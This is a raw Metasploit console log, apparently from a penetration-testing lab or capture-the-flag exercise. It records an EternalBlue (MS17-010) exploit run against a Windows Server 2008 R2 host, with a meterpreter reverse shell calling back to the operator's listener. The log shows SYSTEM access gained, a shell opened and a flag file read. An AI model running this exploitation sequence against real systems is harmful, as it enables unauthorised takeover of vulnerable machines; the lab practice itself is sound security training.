[1m[34m[*][0m Spooling to file msfconsole.log...
[4mmsf6[0m [0m> search eternal blue
[0m
Matching Modules
================

   #  Name                                           Disclosure Date  Rank     Check  Description
   -  ----                                           ---------------  ----     -----  -----------
   0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 [45m[45m[45mEternal[0m[0m[0mRomance/[45m[45m[45mEternal[0m[0m[0mSynergy/[45m[45m[45mEternal[0m[0m[0mChampion SMB Remote Windows Command Execution
   1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
   2  exploit/windows/smb/ms17_010_[45meternal[0m[45mblue[0m       2017-03-14       average  Yes    MS17-010 [45mEternal[0m[45mBlue[0m SMB Remote Windows Kernel Pool Corruption
   3  exploit/windows/smb/ms17_010_[45meternal[0m[45mblue[0m_win8  2017-03-14       average  No     MS17-010 [45mEternal[0m[45mBlue[0m SMB Remote Windows Kernel Pool Corruption for Win8+
   4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 [45m[45m[45mEternal[0m[0m[0mRomance/[45m[45m[45mEternal[0m[0m[0mSynergy/[45m[45m[45mEternal[0m[0m[0mChampion SMB Remote Windows Code Execution
   5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       [32mgreat[0m    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example [32minfo 5[0m, [32muse 5[0m or [32muse exploit/windows/smb/smb_doublepulsar_rce[0m

[4mmsf6[0m [0m> use 2
[0m[1m[34m[*][0m Using configured payload windows/x64/meterpreter/reverse_tcp
[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> options
[0m
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.150.150.242   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.66.67.46      yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> run
[0m
[1m[34m[*][0m Started reverse TCP handler on 10.66.67.46:4444 
[1m[34m[*][0m 10.150.150.242:445 - Executing automatic check (disable AutoCheck to override)
[1m[34m[*][0m 10.150.150.242:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[1m[32m[+][0m 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[1m[34m[*][0m 10.150.150.242:445    - Scanned 1 of 1 hosts (100% complete)
[1m[32m[+][0m 10.150.150.242:445 - The target is vulnerable.
[1m[34m[*][0m 10.150.150.242:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[1m[32m[+][0m 10.150.150.242:445    - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Enterprise 7601 Service Pack 1 x64 (64-bit)
[1m[34m[*][0m 10.150.150.242:445    - Scanned 1 of 1 hosts (100% complete)
[1m[34m[*][0m 10.150.150.242:445 - Connecting to target for exploitation.
[1m[32m[+][0m 10.150.150.242:445 - Connection established for exploitation.
[1m[32m[+][0m 10.150.150.242:445 - Target OS selected valid for OS indicated by SMB reply
[1m[34m[*][0m 10.150.150.242:445 - CORE raw buffer dump (53 bytes)
[1m[34m[*][0m 10.150.150.242:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[1m[34m[*][0m 10.150.150.242:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[1m[34m[*][0m 10.150.150.242:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[1m[34m[*][0m 10.150.150.242:445 - 0x00000030  61 63 6b 20 31                                   ack 1           
[1m[32m[+][0m 10.150.150.242:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[1m[34m[*][0m 10.150.150.242:445 - Trying exploit with 12 Groom Allocations.
[1m[34m[*][0m 10.150.150.242:445 - Sending all but last fragment of exploit packet
[1m[34m[*][0m 10.150.150.242:445 - Starting non-paged pool grooming
[1m[32m[+][0m 10.150.150.242:445 - Sending SMBv2 buffers
[1m[32m[+][0m 10.150.150.242:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[1m[34m[*][0m 10.150.150.242:445 - Sending final SMBv2 buffers.
[1m[34m[*][0m 10.150.150.242:445 - Sending last fragment of exploit packet!
[1m[34m[*][0m 10.150.150.242:445 - Receiving response from exploit packet
[1m[32m[+][0m 10.150.150.242:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[1m[34m[*][0m 10.150.150.242:445 - Sending egg to corrupted connection.
[1m[34m[*][0m 10.150.150.242:445 - Triggering free of corrupted buffer.
[1m[31m[-][0m 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[1m[31m[-][0m 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[1m[31m[-][0m 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[1m[34m[*][0m 10.150.150.242:445 - Connecting to target for exploitation.
[1m[32m[+][0m 10.150.150.242:445 - Connection established for exploitation.
[1m[32m[+][0m 10.150.150.242:445 - Target OS selected valid for OS indicated by SMB reply
[1m[34m[*][0m 10.150.150.242:445 - CORE raw buffer dump (53 bytes)
[1m[34m[*][0m 10.150.150.242:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[1m[34m[*][0m 10.150.150.242:445 - 0x00000010  30 30 38 20 52 32 20 45 6e 74 65 72 70 72 69 73  008 R2 Enterpris
[1m[34m[*][0m 10.150.150.242:445 - 0x00000020  65 20 37 36 30 31 20 53 65 72 76 69 63 65 20 50  e 7601 Service P
[1m[34m[*][0m 10.150.150.242:445 - 0x00000030  61 63 6b 20 31                                   ack 1           
[1m[32m[+][0m 10.150.150.242:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[1m[34m[*][0m 10.150.150.242:445 - Trying exploit with 17 Groom Allocations.
[1m[34m[*][0m 10.150.150.242:445 - Sending all but last fragment of exploit packet
[1m[34m[*][0m 10.150.150.242:445 - Starting non-paged pool grooming
[1m[32m[+][0m 10.150.150.242:445 - Sending SMBv2 buffers
[1m[32m[+][0m 10.150.150.242:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[1m[34m[*][0m 10.150.150.242:445 - Sending final SMBv2 buffers.
[1m[34m[*][0m 10.150.150.242:445 - Sending last fragment of exploit packet!
[1m[34m[*][0m 10.150.150.242:445 - Receiving response from exploit packet
[1m[32m[+][0m 10.150.150.242:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[1m[34m[*][0m 10.150.150.242:445 - Sending egg to corrupted connection.
[1m[34m[*][0m 10.150.150.242:445 - Triggering free of corrupted buffer.
[1m[34m[*][0m Sending stage (200262 bytes) to 10.150.150.242
[1m[34m[*][0m Meterpreter session 2 opened (10.66.67.46:4444 -> 10.150.150.242:51214) at 2021-03-01 05:36:43 +0100
[0m[0m[1m[32m[+][0m 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[1m[32m[+][0m 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[1m[32m[+][0m 10.150.150.242:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

[0m[4mmeterpreter[0m > get uid[K[K[K[Kuid
[0mServer username: NT AUTHORITY\SYSTEM
[4mmeterpreter[0m > shell
[0mProcess 2044 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>cd C:\

C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9

 Directory of C:\

06/27/2016  09:36 AM    <DIR>          inetpub
07/14/2009  03:20 AM    <DIR>          PerfLogs
01/17/2020  06:27 PM    <DIR>          Program Files
10/25/2019  09:04 AM    <DIR>          Program Files (x86)
05/23/2019  08:33 PM    <DIR>          Users
01/17/2020  06:27 PM    <DIR>          Windows
               0 File(s)              0 bytes
               6 Dir(s)  23,360,454,656 bytes free

C:\>cd Users

C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9

 Directory of C:\Users

05/23/2019  08:33 PM    <DIR>          .
05/23/2019  08:33 PM    <DIR>          ..
05/23/2019  08:14 PM    <DIR>          Administrator.GNBUSCA-W054
06/27/2016  09:05 AM    <DIR>          Classic .NET AppPool
06/27/2016  08:58 AM    <DIR>          MSSQL$SQLEXPRESS
07/14/2009  04:57 AM    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  23,360,454,656 bytes free

C:\Users>cd Administrator.GNBUSCA-W054

C:\Users\Administrator.GNBUSCA-W054>dir
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9

 Directory of C:\Users\Administrator.GNBUSCA-W054

05/23/2019  08:14 PM    <DIR>          .
05/23/2019  08:14 PM    <DIR>          ..
05/23/2019  08:14 PM    <DIR>          Contacts
05/24/2019  03:18 PM    <DIR>          Desktop
05/23/2019  08:14 PM    <DIR>          Documents
01/17/2020  06:30 PM    <DIR>          Downloads
05/23/2019  08:14 PM    <DIR>          Favorites
05/23/2019  08:14 PM    <DIR>          Links
05/23/2019  08:14 PM    <DIR>          Music
05/23/2019  08:14 PM    <DIR>          Pictures
05/23/2019  08:14 PM    <DIR>          Saved Games
05/23/2019  08:14 PM    <DIR>          Searches
05/23/2019  08:14 PM    <DIR>          Videos
               0 File(s)              0 bytes
              13 Dir(s)  23,360,454,656 bytes free

C:\Users\Administrator.GNBUSCA-W054>cd Desktop

C:\Users\Administrator.GNBUSCA-W054\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is F80A-FDD9

 Directory of C:\Users\Administrator.GNBUSCA-W054\Desktop

05/24/2019  03:18 PM    <DIR>          .
05/24/2019  03:18 PM    <DIR>          ..
05/24/2019  03:19 PM                40 FLAG34.txt
               1 File(s)             40 bytes
               2 Dir(s)  23,360,454,656 bytes free

C:\Users\Administrator.GNBUSCA-W054\Desktop>type FLAG34.txt
c2e9e102e55d5697ed2f9a7ea63708c1cc411b79
C:\Users\Administrator.GNBUSCA-W054\Desktop>background
'background' is not recognized as an internal or external command,
operable program or batch file.

C:\Users\Administrator.GNBUSCA-W054\Desktop>[4mmeterpreter[0m > background
[0m[1m[34m[*][0m Backgrounding session 2...
[4mmsf6[0m exploit([1m[31mwindows/smb/ms17_010_eternalblue[0m) [0m> spool off
[0m